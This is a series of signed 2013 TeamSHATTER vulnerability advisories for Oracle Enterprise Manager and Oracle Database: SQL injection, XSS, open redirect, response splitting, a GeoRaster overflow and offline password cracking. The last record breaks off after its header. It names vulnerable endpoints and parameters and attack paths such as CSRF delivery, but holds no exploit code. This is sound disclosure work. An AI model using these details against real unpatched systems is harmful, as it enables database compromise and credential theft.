9047,TeamSHATTER Security Advisory: SQL Injection in Oracle EM (Resource Manager) (CVE-2013-0358),,CVE-2013-0358,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (Resource Manager)
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.3, 10.2.0.4, 10.2.0.5,
11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database. SQL
injection can be used to insert additional SQL statements to be executed.
Some parameters of /em/console/database/instance/rsrcpln are vulnerable to SQL
Injection attacks. This web page is part of Oracle Enterprise Manager web
application. This vulnerability allows to execute SQL statements in the
backend database making a web request as an authenticated user. The
vulnerability can be exploited, by means of cross-site request forgery
attacks, when an Administrator with an open OEM session visits a malicious web
site.
Impact:
An attacker hosting a malicious web site can execute SQL statements in the
backend database when an administrator with an open session in Oracle
Enterprise Manager web application visits the malicious web site.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0358
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4149
Timeline:
Vendor Notification - 8/22/2012
Vendor Response - 8/28/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmdCYACgkQRx91imnNIgExpACfTypwOkrsaIsXlStKyF6p/Jrn
5g8AoMuWwLaNQyTKeD8gbNPcKk/BnEjB
=1/1M
-----END PGP SIGNATURE-----"
9048,TeamSHATTER Security Advisory: Cross-site scripting in Oracle EM (advReplicationAdmin) (CVE-2013-0355),,CVE-2013-0355,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Cross-site scripting in Oracle Enterprise Manager (advReplicationAdmin)
TeamSHATTER Security Advisory
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
Cross-site scripting vulnerabilities occur when an attacker tricks a
legitimate web application into sending malicious code, generally in the form
of a script, to an unsuspecting end user. The attack usually involves crafting
a hyperlink with malicious script code embedded within it. A valid user is
likely to click this link since it points to a resource on a trusted domain.
The link can be posted on a web page, or sent in an instant message, or email.
Clicking on the link executes the attacker-injected code in the context of the
trusted web application. Typically, the code steals session cookies, which can
then be used to impersonate a valid user.
There are instances of XSS vulnerabilities in the Distributed/Cross DB
Features of Oracle Enterprise Manager. For example web page
/em/console/database/dist/advRepl/advReplicationAdmin is vulnerable to this
kind of attacks.
Impact:
Attackers might steal administrator's session cookies, thereby allowing the
attacker to impersonate the valid user.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0355
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4162
Timeline:
Vendor Notification - 6/25/2012
Vendor Response - 6/29/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmcToACgkQRx91imnNIgHHPgCdEowSWrZMUIZqCt9l4rZ9jXr3
8bgAnjXHt2HN6LjZ0Ye/bPRwNJAxI5xj
=yJVw
-----END PGP SIGNATURE-----"
9049,TeamSHATTER Security Advisory: Oracle EM Segment Advisor Arbitrary URL redirection/phishing (CVE-2012-3219),,CVE-2012-3219,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
Oracle Enterprise Manager Segment Advisor Arbitrary URL redirection/phishing
vulnerability
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.3, 10.2.0.4; 10.2.0.5,
11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Qinglin Jiang of
Application Security Inc.
Details:
Oracle Enterprise Manager Database Control Segment Advisor page is vulnerable
to an arbitrary URL redirection/phishing vulnerability. An attacker may inject
an arbitrary URL into the web application and force the application to
redirect to it without any validation. This vulnerability can be used in
phishing attacks to trick legitimate users to visit malicious sites without
realizing it. The affected link and parameter are
/em/console/database/xdb/XDBResource and cancelURL.
Impact:
A remote attacker can redirect a legitimate user to a arbitrary URL, which can
result in phishing attacks, trojan distribution, and spamming.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2012-3219
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4159
Timeline:
Vendor Notification - 4/26/2012
Vendor Response - 5/3/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbNsACgkQRx91imnNIgF44wCfZCk/iHG72ifdIh0Q3NX76hm1
KDEAn2HapYPDObVhhrVtIQoHXBbC6INi
=BIt8
-----END PGP SIGNATURE-----"
9050,TeamSHATTER Security Advisory: SQL Injection in Oracle EM (streams queue) (CVE-2013-0373),,CVE-2013-0373,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (streams queue)
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.3, 10.2.0.4, 10.2.0.5,
11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database. SQL
injection can be used to insert additional SQL statements to be executed.
Some parameters of /em/console/database/dist/streams/queue are vulnerable to
SQL Injection attacks. This web page is part of Oracle Enterprise Manager web
application. This vulnerability allows to execute SQL statements in the
backend database making a web request as an authenticated user. The
vulnerability can be exploited, by means of cross-site request forgery
attacks, when an Administrator with an open OEM session visits a malicious web
site.
Impact:
An attacker hosting a malicious web site can execute SQL statements in the
backend database when an administrator with an open session in Oracle
Enterprise Manager web application visits the malicious web site.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0373
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4156
Timeline:
Vendor Notification - 8/22/2012
Vendor Response - 8/28/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmcDwACgkQRx91imnNIgFGRwCeJbqzhJQUVTvtjqDrprL+Zt9K
yu4An2Q0aqEe5+bdvyLjvWgoYlJbAVNb
=dUgv
-----END PGP SIGNATURE-----"
9051,TeamSHATTER Security Advisory: SQL Injection in Oracle EM (SCPLBL_COLLECTED parameters) (CVE-2013-0353),,CVE-2013-0353,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (SCPLBL_COLLECTED parameters)
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database. SQL
injection can be used to insert additional SQL statements to be executed.
Some parameters of /em/console/ecm/config/savedConfig are vulnerable to SQL
Injection attacks. This web page is part of Oracle Enterprise Manager web
application. It may be possible for a malicious user to execute a function
with the elevated privileges of the SYSMAN database user in the repository
database. This user has the DBA role granted. This vulnerability can also be
exploited, by means of cross-site request forgery attacks, when an
Administrator with an open OEM session visits a malicious web site.
Impact:
This vulnerability allow a Oracle Enterprise Manager user with VIEW (or more)
privileges to execute a function call with the elevated privileges of the
SYSMAN database user.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0353
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4152
Timeline:
Vendor Notification - 6/25/2012
Vendor Response - 6/29/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbNsACgkQRx91imnNIgFEeQCfYDk846kd3FWKZJhddwvxxkdn
gwoAoNN3xyIA07cAAlkXbywWnVZI8icC
=6QMP
-----END PGP SIGNATURE-----"
9052,TeamSHATTER Security Advisory: SQL Injection in Oracle EM (dBClone) (CVE-2013-0374),,CVE-2013-0374,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (dBClone)
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.3, 10.2.0.4, 10.2.0.5,
11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database. SQL
injection can be used to insert additional SQL statements to be executed.
Some parameters of /em/console/database/dbclone/dBClone are vulnerable to SQL
Injection attacks. This web page is part of Oracle Enterprise Manager web
application. It may be possible for a malicious user to execute a function
with the elevated privileges of the SYSMAN database user in the repository
database. This user has the DBA role granted. This vulnerability can also be
exploited, by means of cross-site request forgery attacks, when an
Administrator with an open OEM session visits a malicious web site.
Impact:
This vulnerability allow a Oracle Enterprise Manager user with VIEW (or more)
privileges to execute a function call with the elevated privileges of the
SYSMAN database user.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0374
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4145
Timeline:
Vendor Notification - 8/22/2012
Vendor Response - 8/28/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbNsACgkQRx91imnNIgHo7QCfSJQzpaRGl//95FKIt5zSMtCF
8pYAoI4zumPicyj1j4m5ru3kXahkwHzd
=uU10
-----END PGP SIGNATURE-----"
9053,TeamSHATTER Security Advisory: SQL Injection in Oracle EM (advReplicationAdmin) (CVE-2013-0372),,CVE-2013-0372,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (advReplicationAdmin)
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database. SQL
injection can be used to insert additional SQL statements to be executed. Some
parameters of /em/console/database/dist/advRepl/advReplicationAdmin are
vulnerable to SQL Injection attacks. This web page is part of Oracle
Enterprise Manager web application. This vulnerability allows to execute SQL
statements in the backend database making a web request as an authenticated
user. The vulnerability can be exploited, by means of cross-site request
forgery attacks, when an Administrator with an open OEM session visits a
malicious web site.
Impact:
An attacker hosting a malicious web site can execute SQL statements in the
backend database when an administrator with an open session in Oracle
Enterprise Manager web application visits the malicious web site.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0372
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4142
Timeline:
Vendor Notification - 8/22/2012
Vendor Response - 8/28/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbmUACgkQRx91imnNIgGmpQCgr8Wzc9CkJVzkVTxXx9ro8U1h
aFkAoLLabATVXrBOLKKz9/yE9z49pB+P
=WaN+
-----END PGP SIGNATURE-----"
9054,TeamSHATTER Security Advisory: HTTP Response Splitting in Oracle EM (policyViewSettings) (CVE-2013-0354),,CVE-2013-0354,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
HTTP Response Splitting in Oracle Enterprise Manager (policyViewSettings)
February 20, 2013
Risk Level:
Medium
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
HTTP Response Splitting is a web application vulnerability where input
parameters are unsafely used in response headers allowing an attacker to make
the server print one (or more) new line sequences in the header section which
allows to set arbitrary headers, take control of the body, or break the
response into two or more separate responses. This can be used to perform
cross-site scripting, cross-user defacement and web cache poisoning, among
other attacks. The 'pagename' parameter of web page
/em/console/ecm/policy/policyViewSettings is vulnerable to this kind of
attacks.
Impact:
An attacker that convinces a valid Oracle Enterprise Manager user to click or
open a malicious link can take over the user's session.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0354
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4138
Timeline:
Vendor Notification - 6/25/2012
Vendor Response - 6/29/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbcQACgkQRx91imnNIgGIXgCghhi6V4QeGQd906/jQwUoCBFL
EM4AoKvhlJs8KHaJfLQLBdhMWgnzx5vD
=xePM
-----END PGP SIGNATURE-----"
9055,TeamSHATTER Security Advisory: Oracle Database GeoRaster API overflow (CVE-2012-3220),,CVE-2012-3220,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
Oracle Database GeoRaster API overflow
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Database 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Martin Rakhmanov of
Application Security Inc.
Details:
GeoRaster is a feature of Oracle Spatial that lets you store, index, query,
analyze, and deliver GeoRaster data. One of the GeoRaster APIs is prone to
stack-based overflow.
Impact:
An attacker that can connect to database with spatial support can execute
arbitrary code in the server's process context.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
Do not install spatial support in the database.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2012-3220
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4134
Timeline:
Vendor Notification - 5/3/2012
Vendor Response - 5/4/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbNsACgkQRx91imnNIgGm0wCgoCDtw7yex8egWX0in3tTYGHm
R60Anjf9fKfxgr6y4E28pn3Z+xLWNoJV
=9NkT
-----END PGP SIGNATURE-----"
9056,TeamSHATTER Security Advisory: Oracle EM Cross Site Scripting in XDBResource cancelURL parameter (CVE-2013-0352),,CVE-2013-0352,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
Oracle Enterprise Manager Cross Site Scripting in XDBResource cancelURL
parameter
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.3, 10.2.0.4; 10.2.0.5,
11.1.0.7, 11.2.0.2, 11.2.0.3
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Qinglin Jiang of
Application Security Inc.
Details:
Oracle Enterprise Manager Database Control XML Database Resources page is
vulnerable to a Cross-Site scripting vulnerability. An attacker may inject
malicious code into the web application and trick a legitimate user to execute
it by various methods. The malicious code generally appears in the form of a
script and will be executed in the context of the legitimate user. If a
legitimate user is in a trusted domain or has already been authenticated, the
malicous user may be able to steal session cookies to impersonate a legitimate
user and perform some illegal operations on the web application.
Impact:
Attackers might steal legitimate user's session cookies to impersonate a
legitimate user and perform illegal operations.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply January 2013 CPU.
CVE:
CVE-2013-0352
Links:
http://www.oracle.com/technetwork/topics/security/cpujan2013-1515902.html
https://www.teamshatter.com/?p=4125
Timeline:
Vendor Notification - 6/25/2012
Vendor Response - 6/29/2012
Fix - 1/15/2013
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmbNsACgkQRx91imnNIgEXXwCfXMTXf0nmulBLrzLiW7PJ5oDF
8CgAoK1NSJ0yR1HAaRm/P8B53i3sU/Om
=TB1N
-----END PGP SIGNATURE-----"
9058,TeamSHATTER Security Advisory: Oracle 11g Stealth Password Cracking Vulnerability (CVE-2012-3137),,CVE-2012-3137,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
Oracle 11g Stealth Password Cracking Vulnerability
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Database Server version 11gR1, 11gR2
Remote exploitable:
Yes (No authentication to Database Server is needed)
Credits:
This vulnerability was discovered and researched by Esteban Martinez Fayo of
Application Security Inc.
Details:
There is a flaw in the way that Authentication Session Keys are generated and
protected by Oracle Database Server during the authentication process. It is
possible to use this flaw to perform unlimited password guesses (cracking) of
any user password in a similar way as if the password hash would be available.
All users that are authenticated by the database using logon protocol version
11 are affected by this vulnerability. This includes all users created with
the ""IDENTIFIED BY"" clause, including the SYS user.
The attack can be performed remotely without the need of a valid username and
password. The attacker just needs to know the SID of the database and the
name of a valid user. The attack can be done with just a few network packets
and without leaving any trace in native auditing facilities.
Impact:
Remote unauthenticated attackers can perform offline bruteforce on users
passwords, testing millions of passwords per second.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
Some possible workarounds:
1) Use strong user passwords. A strong password will make password guessing
more difficult (or impossible) to solve in reasonable time.
2) Use external authentication. Only users that are authenticated by the
database are affected by this vulnerability. Users that are authentication by
external means are not affected; this includes users authenticated by the
Operating System and the Network (SSL or third-parties like Kerberos).
3) Disable protocol version 11 and use version 10 or lower instead. To do
this, set initialization parameter SEC_CASE_SENSITIVE_LOGON to FALSE.
See https://www.teamshatter.com/?p=3951 for more information about the
workarounds.
Fix:
Apply Oracle Critical Patch Update October 2012 available at Oracle Support.
CVE:
CVE-2012-3137
Links:
http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
https://www.teamshatter.com/?p=4120
https://www.teamshatter.com/?p=3951
Timeline:
Vendor Notification - 4/21/2010
Vendor Response - 4/26/2010
Fix - 10/16/2012
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmKt8ACgkQRx91imnNIgHM8wCeI7rz04b9jdt/uriRs+Su2m4R
SDUAoJoTdwrJYSfl6aN9Hb+ieGs7dHk9
=yOaN
-----END PGP SIGNATURE-----"
9059,TeamSHATTER Security Advisory: SQL Injection in Oracle Alter FBA Table (CVE-2012-1751),,CVE-2012-1751,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
TeamSHATTER Security Advisory
